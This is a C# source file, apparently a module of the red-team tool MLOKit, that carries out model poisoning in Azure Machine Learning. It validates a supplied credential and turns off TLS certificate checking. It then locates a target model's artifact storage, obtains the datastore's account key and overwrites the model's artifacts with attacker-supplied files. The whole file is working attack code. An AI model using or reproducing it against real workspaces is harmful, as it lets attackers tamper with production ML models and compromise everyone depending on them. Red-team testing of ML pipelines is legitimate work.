using System;
using System.Net;
using System.Threading.Tasks;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;
using System.Collections.Generic;
using System.IO;
using System.Threading;

namespace MLOKit.Modules.AzureML
{
    class PoisonModel
    {

        public static async Task execute(string credential, string platform, string subscriptionID, string region, string resourceGroup, string workspace, string modelID, string sourceDir)
        {
            // Generate module header
            Console.WriteLine(Utilities.ArgUtils.GenerateHeader("poison-model", credential, platform));

            // check for additional required arguments
            if (subscriptionID.Equals("") || region.Equals("") || resourceGroup.Equals("") || workspace.Equals("") || modelID.Equals(""))
            {
                Console.WriteLine("");
                Console.WriteLine("[-] ERROR: Missing one of required command arguments");
                Console.WriteLine("");
                return;
            }

            // ignore SSL errors
            ServicePointManager.ServerCertificateValidationCallback = delegate (object s, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) { return true; };
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            try
            {

                Console.WriteLine("");
                Console.WriteLine("[*] INFO: Performing poison-model module for " + platform);
                Console.WriteLine("");

                // check if credentials provided are valid
                Console.WriteLine("[*] INFO: Checking credentials provided");
                Console.WriteLine("");

                // if creds valid, then provide message
                if (await Utilities.AzureML.WebUtils.credsValid(credential, "https://management.azure.com/subscriptions?api-version=2022-12-01"))
                {
                    Console.WriteLine("[+] SUCCESS: Credentials provided are VALID.");
                    Console.WriteLine("");


                    try
                    {
                        string finalDatStoreName = "";
                        string storageContainer = "";
                        string relativePath = "";


                        // create table header
                        string tableHeader = string.Format("{0,30} | {1,30} | {2,15} | {3,25} | {4,25}", "Name", "ID", "Model Type", "Creation Time", "Update Time");
                        Console.WriteLine(tableHeader);
                        Console.WriteLine(new String('-', tableHeader.Length));

                        // get the model by model ID
                        Objects.AzureML.Model model = await Utilities.AzureML.ModelUtils.getSingleModel(credential, subscriptionID, region, resourceGroup, workspace, modelID);
                        Console.WriteLine("{0,30} | {1,30} | {2,15} | {3,25} | {4,25}", model.modelName, model.modelID, model.modelType, model.createdTime, model.modifiedTime);


                        // get the asset prefix based on the model's asset ID
                        Console.WriteLine("");
                        List<string> assetPrefixList = await Utilities.AzureML.ModelUtils.getAssetPrefixes(credential, subscriptionID, region, resourceGroup, workspace, model.assetID);
                        foreach (string assetPrefix in assetPrefixList)
                        {
                            // get the SAS tokens and contentURI's based on the artifact prefix
                            List<string> contentURIList = await Utilities.AzureML.ModelUtils.getContentURIs(credential, subscriptionID, region, resourceGroup, workspace, assetPrefix);
                            string datastoreType = "";
                            string accountName = "";
                            string path = "";
                            string containerName = "";
                            

                            // go through each content URI that includes the SAS token and list it
                            foreach (string contentURI in contentURIList)
                            {
                                // parse the actual file name
                                int startIndex = contentURI.LastIndexOf('/') + 1;
                                int endIndex = contentURI.IndexOf('?');
                                string fileName = contentURI.Substring(startIndex, endIndex - startIndex);
                                
                                // determine the datastore type where model artifacts are being stored
                                if(contentURI.Contains("blob.core.windows.net"))
                                {
                                    datastoreType = "AzureBlob";
                                }
                                else if (contentURI.Contains("file.core.windows.net"))
                                {
                                    datastoreType = "AzureFile";
                                }

                                // parse the content URI to get the account name, container name, and relative path that will be required for uploading a poisoned model
                                string[] splitContentURI = contentURI.Split('/');
                                accountName = splitContentURI[2];
                                accountName = accountName.Replace(".blob.core.windows.net", "");
                                accountName = accountName.Replace(".file.core.windows.net", "");
                                containerName = splitContentURI[3];
                                int indexOfStartPath = contentURI.IndexOf("/" + containerName + "/");
                                int endIndexOfPath = contentURI.IndexOf(fileName + "?");
                                path = contentURI.Substring(indexOfStartPath, endIndexOfPath - indexOfStartPath);
                                path = path.Replace("/" + containerName + "/", "");
                                relativePath = path;


                            }

                            // List details about the model artifact location
                            Console.WriteLine("");
                            Console.WriteLine("[*] INFO: Listing Model Artifact Location Info:");
                            Console.WriteLine("");
                            Console.WriteLine("Account Name: " + accountName);
                            Console.WriteLine("");
                            Console.WriteLine("Datastore Type: " + datastoreType);
                            Console.WriteLine("");
                            Console.WriteLine("Container Name: " + containerName);
                            Console.WriteLine("");
                            Console.WriteLine("Path: " + path);
                            Console.WriteLine("");

                            Console.WriteLine("[*] INFO: Getting associated datastore for model artifacts:");
                            Console.WriteLine("");

                            // create table header to list the datastore info where we will be uploading the poisoned model artifacts
                            string tableHeaderDatastores = string.Format("{0,30} | {1,50} | {2,15} | {3,25}", "Account Name", "Container Name", "Datastore Type", "Datastore Name");
                            Console.WriteLine(tableHeaderDatastores);
                            Console.WriteLine(new String('-', tableHeaderDatastores.Length));

                            // get all datastores and list them. only display one associated with model artifacts
                            List<Objects.AzureML.Datastore> dataStoreList = await Utilities.AzureML.DatastoreUtils.getAllDataStores(credential, subscriptionID, region, resourceGroup, workspace);
                            foreach(Objects.AzureML.Datastore datStore in dataStoreList)
                            {

                                // find the one associated with model artifacts
                                if (datStore.accountName.ToLower().Equals(accountName.ToLower()) && datStore.containerName.ToLower().Equals(containerName.ToLower()) && datStore.datStoreType.ToLower().Equals(datastoreType.ToLower()))
                                {
                                    Console.WriteLine("{0,30} | {1,50} | {2,15} | {3,25}", datStore.accountName, datStore.containerName, datStore.datStoreType, datStore.datstoreName);
                                    finalDatStoreName = datStore.datstoreName;
                                    storageContainer = datStore.containerName;

                                }
                            }


                        }

                        Console.WriteLine("");
                        Console.WriteLine("[*] INFO: Uploading model artifacts");
                        Console.WriteLine("");


                        // get the account key for a given datastore where the model artifacts are
                        Objects.AzureML.Datastore datastore = await Utilities.AzureML.DatastoreUtils.getSingleDatastore(credential, subscriptionID, region, resourceGroup, workspace, finalDatStoreName);


                        // upload each file to the Azure storage location associated with the model to poison.
                        foreach (string fileName in Directory.EnumerateFiles(sourceDir))
                        {
                            // get just the file name so we maintain that when uploading
                            string justFileName = fileName;
                            int lstIndex = justFileName.LastIndexOf('\\');
                            justFileName = justFileName.Substring(lstIndex + 1, justFileName.Length - lstIndex - 1);
                            Console.WriteLine("[*] INFO: Uploading: " + justFileName);
                            Console.WriteLine("");

                            // upload the file to appropriate datastore
                            byte[] theFile = File.ReadAllBytes(fileName);
                            string responseContent = await Utilities.AzureML.DatastoreUtils.uploadFileToDatastore(datastore.accountName, datastore.datastoreCredential, storageContainer, relativePath + justFileName, theFile,CancellationToken.None);
                        }

                        Console.WriteLine("[+] SUCCESS: Model has been poisoned with model artifacts specified in source directory");
                        Console.WriteLine("");



                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("");
                        Console.WriteLine("[-] ERROR: " + ex.Message);
                        Console.WriteLine("");
                    }


                }

                // if creds not valid, display message
                else
                {
                    Console.WriteLine("[-] ERROR: Credentials provided are INVALID. Check the credentials again.");
                    Console.WriteLine("");
                }



            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] ERROR: " + ex.Message);
                Console.WriteLine("");
            }

        }


    }
}
